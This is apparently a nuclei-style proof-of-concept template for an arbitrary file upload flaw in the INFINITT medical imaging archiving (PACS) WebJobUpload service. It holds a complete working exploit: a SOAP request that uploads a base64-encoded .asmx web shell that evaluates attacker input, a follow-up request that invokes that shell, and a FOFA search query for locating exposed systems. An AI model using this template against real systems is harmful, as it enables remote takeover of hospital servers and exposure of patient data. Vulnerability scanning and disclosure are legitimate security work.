poc/other/TVE-2024-105171524.yaml

id: 2024-105171524

info:
  name: 英飞达医学影像存档与通信系统 WebJobUpload 任意文件上传漏洞
  author: k3ppf0r
  severity: critical
  description: |  
    英飞达医学影像存档与通信系统 WebJobUpload 接口任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/139000452
  remediation: |
    打对应补丁，重启服务
  classification:
    cve-id: 2024-105171524
    cvss-score: 9.5
    cwe-id: CWE-434
  metadata:
    date: 2024-05-17
    version: 英飞达医学影像存档与通信系统
    fofa-query: '"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")'
  tags: fileupload,rce,英飞达医学影像存档与通信系统

# ==================
#       文件上传
# ==================
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
  file_content: "file error"

http:
  - raw:
      - |-
        POST /webservices/WebJobUpload.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Content-Type: text/xml; charset=utf-8
        Soapaction: "http://rainier/jobUpload"
        Connection: close
        
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
        <jobUpload xmlns="http://rainier">
        <vcode>1</vcode>
        <subFolder></subFolder>
        <fileName>{{randstr_1}}.asmx</fileName>
        <bufValue>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</bufValue>
        </jobUpload>
        </soap:Body>
        </soap:Envelope>

      - |
        GET /1/{{randstr_1}}.asmx/Cmdshell?Pass=Response.Write("Hello,World") HTTP/1.1
        Host: {{Hostname}}
  
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "Hello,World")'
        condition: and
